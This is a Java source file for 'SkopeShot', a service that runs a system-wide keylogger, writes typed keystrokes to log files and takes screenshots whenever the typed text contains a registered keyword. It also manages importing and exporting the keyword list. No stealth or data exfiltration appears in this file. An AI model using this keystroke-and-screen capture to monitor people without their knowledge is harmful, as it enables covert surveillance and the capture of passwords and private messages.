package com.gundersoft.skope3;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Iterator;
import java.util.LinkedList;

import org.jnativehook.NativeHookException;

/**
 * SkopeShot Service main class file. Creates and monitors 
 * a keylogger service and watches the input for keywords. If any
 * keywords match, takes screenshots according to Keyword object
 * parameters.
 * @author Christian Gunderman
 */
public class Service {
	/** Determines whether or not the Service is enabled */
	private boolean enabled;
	/** Stores the keylogger service object */
	private Keylogger keylogger;
	/** A Keyword object containing the new keyword defaults */
	private Keyword defaults;
	/** A linked list of keyword objects */
	private LinkedList<Keyword> keywords;
	/** The logging system for this application */
	private Log log;
	
	/**
	 * Instantiates the SkopeShot service with the given default delay, default number
	 * and outputs all keylogger buffer flushes to the given files.
	 * @param defaultDelay Default milliseconds delay between each SkopeShot. 
	 * @param defaultNumber Default number of Skope Shots taken each time an alert
	 * is triggered.
	 * @param textLogFile The file that the readable text log will be saved to.
	 * @param keyLogFile The file that the pressed keys log will be saved to.
	 * @param timeStampMillis The delay between time stamps being appended to the
	 * keylog buffer.
	 * @param flushMillis The delay between the buffer being flushed to file.
	 * @throws NativeHookException Thrown if JNativeHook can't obtain a keyboard
	 * hook from the OS.
	 */
	public Service(int defaultDelay, int defaultNumber, String textLogFile, 
			String keyLogFile, int timeStampMillis, int flushMillis, Log log) 
					throws NativeHookException {
		
		// create keylogger 
		this.keylogger = new Keylogger(new Keylogger.Event() {
			
			/**
			 * Triggered if a letter is typed
			 */
			@Override
			public void keyTyped() {
				// check if service is enabled
				if(!Service.this.enabled)
					return;
				
				// check for keywords in the text buffer
				Keyword keyword;
				if((keyword = checkForKeywords(keylogger.getLiteralText())) != null) {
					
					Service.this.log.i("Keyword detected. Start capture.");
					
					// trigger SkopeShot
					new Capture.PicRobot("captures/" + keyword.keyword, keyword.delay, keyword.number).start();
					try {
						keylogger.flushBuffers(); // flush buffer to prevent dual detection
					} catch (IOException e) {
						Service.this.log.e("Unable to write to the keylog files.");
						return;
					}
				}
			}
			
			/**
			 * Not used
			 */
			@Override
			public void keyPressed() {
			}
			
			/**
			 * Not used
			 */
			@Override
			public void buffersFlushed() {
			}
			
		}, textLogFile,
		keyLogFile,	timeStampMillis, flushMillis);
		
		// store keyword defaults
		this.defaults = new Keyword(null, defaultDelay, defaultNumber);
		
		// store log context
		this.log = log;
		
		// create list of keywords
		keywords = new LinkedList<Keyword>();
		
		// set to disabled by default
		this.enabled = false;
		
	}
	
	/**
	 * Gets a reference to the Keylogger Service object contained
	 * within this Service object.
	 * @return A Keylogger object.
	 */
	public Keylogger getKeylogger() {
		return this.keylogger;
	}
	
	/**
	 * Gets a Keyword object containing the default settings for
	 * all new Keywords.
	 * @return The default Keyword.
	 */
	public Keyword getDefaults() {
		return this.defaults;
	}
	
	/**
	 * Determines if service is enabled.
	 * @return True if enabled, false if not enabled.
	 */
	public boolean isEnabled() {
		return this.enabled;
	}
	
	/**
	 * Checks the list of keywords for matches.
	 * @param buffer The string buffer to search for 
	 * keywords.
	 * @return Returns the first keyword match that is 
	 * found, or null for none.
	 */
	private Keyword checkForKeywords(String buffer) {
		
		// check each keyword to see if its in the buffer
		String lowBuffer = buffer.toLowerCase();
		for(Keyword k : keywords) {
			if(lowBuffer.contains(k.keyword.toLowerCase()))
				return k;
		}
		return null;
		
	}
	
	/**
	 * Writes all keywords to a text file in the format: [word] [delay] [number] \n
	 * ex: foobar 10 1000 [newline]. These values can be reloaded using the import 
	 * keywords function.
	 * @param fileName The file to export the keywords to.
	 * @return Returns true if the write operation succeeds, or false if unable
	 * to write.
	 */
	public boolean exportKeywords(String fileName) {
		FileWriter writer = null;
		try {
			writer = new FileWriter(fileName);
			for(Keyword k : keywords) {
				writer.write(k.keyword);
				writer.write(' ');
				writer.write(Integer.toString(k.delay));
				writer.write(' ');
				writer.write(Integer.toString(k.number));
				writer.write("\r\n");
			} 
			writer.close();
		} catch (IOException e) {
			this.log.e("Unable to export SkopeShot Service keywords to file.");
			return false;
		}
		return true;
	}
	
	/**
	 * Imports a file of exported Keywords into the Service object.
	 * @param fileName A file of keywords, one on each line with a 
	 * number and delay separated by spaces.
	 * @return True if import succeeds, and false if unable to import
	 */
	public boolean importKeywords(String fileName) {
		FileReader reader = null;
		try {
			int c = 0, type = 0;
			reader = new FileReader(fileName);
			StringBuilder buffer = new StringBuilder();
			Keyword current = new Keyword("", 0, 0);
			while((c = reader.read()) != -1) {
				if((char)c == ' ') {
					switch(type) {
					case 0:
						current.keyword = buffer.toString();
						type++;
						break;
					case 1:
						current.delay = Integer.parseInt(buffer.toString());
						type = 0;
						break;
					}
					buffer = new StringBuilder();
				} else if ((char)c == '\n') {
					current.number = Integer.parseInt(buffer.toString());
					this.keywords.add(current);
					buffer = new StringBuilder();
					current = new Keyword("", 0, 0);
				} else if ((char)c == '\r') {
					// do not add this char to buffer
				} else
					buffer.append((char)c);
			}
			reader.close();
		} catch (IOException e) {
			this.log.e("Unable to import SkopeShot Service keywords from file.");
			return false;
		}
		return true;
	}
	
	/**
	 * Enables or disables the Service.
	 * @param enabled If true, the service is enabled. If false, it stops
	 * monitoring.
	 */
	public void setEnabled(boolean enabled) {
		this.enabled = enabled;
		this.keylogger.setEnabled(enabled);
	}
	
	/**
	 * Registers a new keyword into the Service with the default delay and number
	 * settings.
	 * @param keyword The new keyword.
	 */
	public void registerKeyword(String keyword) {
		registerKeyword(keyword, this.defaults.delay, this.defaults.number);
	}
	
	/**
	 * Registers a new Keyword with the given delay and setting it up to take
	 * the specified number of shots when triggered.
	 * @param keyword The keyword to add to the list.
	 * @param delay The delay between shots in milliseconds.
	 * @param number The number of shots to take in each alert.
	 */
	public void registerKeyword(String keyword, int delay, int number) {
		
		// get the keyword object
		Keyword old = getKeyword(keyword);
		
		// change the keyword settings.
		if(old != null) {
			old.delay = delay;
			old.number = number;
		} else
			keywords.add(new Keyword(keyword, delay, number));
		
	}
	
	/**
	 * Deletes a keyword from the list of keywords.
	 * @param keyword The keyword to delete.
	 */
	public void deleteKeyword(String keyword) {
		Iterator<Keyword> iterator = keywords.iterator();
		while(iterator.hasNext()) {
			if(iterator.next().keyword.equals(keyword)) {
				iterator.remove();
				return;
			}
		}
	}
	
	/**
	 * Gets the Keyword object with the specified Keyword String.
	 * @param keyword The keyword object to search for.
	 * @return The keyword object, or null.
	 */
	public Keyword getKeyword(String keyword) {
		for(Keyword k : keywords) {
			if(k.keyword.equals(keyword))
				return k;
		}
		return null;
	}
	
	/**
	 * Sets the delay between Skope Shots.
	 * @param keyword The Keyword String of the keyword to change.
	 * @param delay The delay in millisenconds.
	 */
	public void setKeywordDelay(String keyword, int delay) {
		Keyword word = getKeyword(keyword);
		if(word != null) {
			word.delay = delay;
		}
	}
	
	/**
	 * Sets a Keyword object's capture number.
	 * @param keyword Keyword String
	 * @param number Number of shots per triggered event.
	 */
	public void setKeywordNumber(String keyword, int number) {
		Keyword word = getKeyword(keyword);
		if(word != null) {
			word.number = number;
		}
	}
	
	/**
	 * Gets an array of the keyword Strings registered to the service.
	 * @return An array of the keyword Strings.
	 */
	public String[] getKeywordArray() {
		String[] keywordsArray = new String[keywords.size()];
		int i = 0;
		for(Keyword k : keywords) {
			keywordsArray[i] = k.keyword;
			i++;
		}
		return keywordsArray;
	}
	
	/**
	 * Represents a Keyword and its settings.
	 */
	public class Keyword {
		/** The Keyword's String object */
		private String keyword;
		/** The delay between SkopeShots */
		private int delay;
		/** The delay in milliseconds between shots */
		private int number;
		
		/**
		 * Creates the object with basic parameters.
		 * @param keyword The keyword.
		 * @param delay The delay between shots.
		 * @param number The number of shots.
		 */
		public Keyword(String keyword, int delay, int number) {
			this.keyword = keyword;
			this.delay = delay;
			this.number = number;
		}
		
		/**
		 * Gets the String representation.
		 * @return The keyword String.
		 */
		public String getKeyword() {
			return this.keyword;
		}
		
		/**
		 * Gets the delay for this keyword.
		 * @return Delay in milliseconds.
		 */
		public int getDelay() {
			return this.delay;
		}
		
		/**
		 * Gets the number of shots for this keyword.
		 * @return The number of shots that will be taken.
		 */
		public int getNumber() {
			return this.number;
		}
	}
}
